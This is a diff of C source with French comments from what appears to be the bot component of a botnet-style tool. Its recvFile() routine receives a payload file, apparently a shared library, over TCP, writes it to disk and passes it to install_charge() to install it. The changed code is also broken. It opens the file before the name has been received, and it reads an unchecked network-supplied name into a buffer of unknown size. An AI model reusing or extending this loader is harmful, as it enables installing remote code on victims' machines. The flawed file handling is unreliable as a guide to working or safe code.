@@ -47,18 +47,18 @@ void gestionClientTCP(void *s)
  * elle le receptionne et le crée dans son dossier
  * param pointeur vers la socket TCP
  */
-void recvFile(void *s)
+void recvFile(void *s, char* filename)
 {
     //TODO : Il faut que recvFile prenne un pointeur de filename
     int socket_tcp = *((int *)s);
     char buff[BUFSIZ]; // to store file from client
     char file_size[256];
-    char file_name[TAILLE_FILENAME];
+    //char file_name[TAILLE_FILENAME];
     ssize_t len;
     FILE *fp;
     //Todo : Ce filename doit être recu par la socket
-    strcpy(file_name, "example.so");
-    fp = fopen("example.so", "w"); // stores the file content in start in the program directory
+    //strcpy(file_name, "example.so");
+    fp = fopen(filename, "w"); // stores the file content in start in the program directory
     if (fp == NULL)
     {
         printf("Error IN Opening File\n");
@@ -67,7 +67,7 @@ void recvFile(void *s)
 
     //Recoit le nom de la charge utile
     //TODO : Gérer les retours d'erreur
-    recv(socket_tcp, file_name, TAILLE_FILENAME, 0);
+    recv(socket_tcp, filename, TAILLE_FILENAME, 0);
     // if(erreur)
     //     appel fonction erreur
 
@@ -92,11 +92,9 @@ void recvFile(void *s)
     printf("File received successfully !! \n");
     printf("New File created is start !! \n");
 
-    //  Copier dans /usr/local/lib
+    printf("La charge utile %s a bien été installée ! \n", filename);
 
-    printf("La charge utile %s a bien été installée ! \n", file_name);
-
-    install_charge(file_name);
+    install_charge(filename);
 }
 /**
  * void nouveauClient(int dialogue)
@@ -144,7 +142,7 @@ void TCP(void *arg)
  * Fonction wrapper qui initialise le serveur TCP dans un thread
  * 
  */
-void partie_tcp()
+void partie_tcp_BOT()
 {
     if (lanceThread(TCP, (void *)NULL, 0) < 0)
     {
